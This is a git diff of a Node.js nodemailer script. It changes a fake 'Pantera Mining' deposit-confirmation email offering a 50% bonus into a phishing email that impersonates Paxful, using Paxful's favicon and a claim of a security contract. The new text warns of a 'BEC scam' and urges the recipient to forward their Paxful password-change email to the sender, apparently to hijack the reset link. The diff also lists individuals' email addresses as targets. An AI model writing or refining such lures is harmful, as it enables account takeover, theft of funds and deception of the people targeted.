@@ -24,16 +24,10 @@ let create_mail_options = (userInfo) => {
     from: "support@softjovial.com",
     // from:"michelleannschlloser@outlook.com",
     to: userInfo.reciever,
-    subject: `Deposit Confirmation Notification`,
+    subject: `Don't take any action regarding your change of your paxful account password  `,
     //   text:"just wanna know if this works",
     html: `
- <link rel="preconnect" href="https://fonts.googleapis.com" />
-<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
-<link
-  href="https://fonts.googleapis.com/css2?family=Nanum+Gothic+Coding&family=Nunito+Sans:ital,wght@0,600;0,700;1,600&family=Nunito:ital,wght@0,200;0,300;1,200&family=Open+Sans&family=Poppins:wght@200&family=Roboto:wght@400;500&display=swap"
-  rel="stylesheet"
-/>
-
+ 
 <main>
   <style>
 @import url('https://fonts.googleapis.com/css2?family=Nanum+Gothic+Coding&family=Nunito+Sans:ital,wght@0,600;0,700;1,600&family=Nunito:ital,wght@0,200;0,300;1,200&family=Open+Sans&family=Poppins:wght@200&family=Roboto:wght@400;500&display=swap');
@@ -89,30 +83,27 @@ font-family: 'Roboto', sans-serif;
 
 
     <div class="head-txt">
+   <div style="text-align: center;">
+    <img src="https://paxful.com/assets/images/favicons/favicon-16x16.png?v=1669382431" alt="" style="height: 40px;">
+</div>
 
-      <h3 style="text-align: center; font-size: 16px; color: #825ee4">DEPOSIT CONFIRMATION NOTIFICATION</h3>
+      <h3 style="text-align: center; font-size: 16px; color: #612c95">Paxful BEC scam</h3>
     </div>
 
     <p class="sm-p">
-      Dear ${userInfo.first_name} ${userInfo.last_name}, your deposit has been proccessed and approved 
-      on <b>${datetime}</b>.
-    your fund has been deposited into your account with 50% first deposit bonus added
+     Paxful recently signed a security contract with us and our system just discoverd an email impersonating to be from paxful was recently sent to you requesting you to chage your password which you never initiated.
     </p>
     <p class="sm-p">
-      For more detailed informations, please contact our customer support or your
-      relationship officer
+    Do not take any action regarding to this email since it's a Business Email compromise scam and if you take any action your password would be stolen. Just forward the email that was sent to you to this email for a proper security check 
     </p>
 
-    <p class="sm-p">
-      incase you have any questions do not hesitate to contact us and we will
-      reach out to you as soon as possible
-    </p>
+    <b >
+    For your security forward the email that was sent to your email regarding your paxful account password change to this email for our customer support to go through it and consult a proper security verification on this email
+    </b>
     <br />
-    <h1 style="  font-size: 17px; text-align: center;  background: linear-gradient(87deg, #5e72e4 0, #825ee4 100%); color: #fff;" >PANTERA MINING</h1>
-   <p class="disclaimer" style="font-size: 12px; font-weight: bolder">
-      Disclaimer: this message was automatically generated via pantera mining
-      secured channel,please do not reply to this message all correspondence
-      should be addressed to panteramining.com or your relationship officer
+ 
+       <p class="disclaimer" style="font-size: 12px; font-weight: bolder">
+      Disclaimer: this message was automatically generated via softjovial in relation to paxful.com
     </p>
   </div>
 </main>
@@ -120,12 +111,11 @@ font-family: 'Roboto', sans-serif;
   });
 };
 
-
 transporter.sendMail(
   create_mail_options({
-    first_name: "chidera",
-    last_name: "nwofe",
-    reciever: "chideranwofe02@gmail.com",
+    // first_name: "Shehan",
+    // last_name: "Madushan",
+    reciever: "atambolambo458@outlook.com",
   }),
   (err, info) => {
     if (err) return console.log(err);
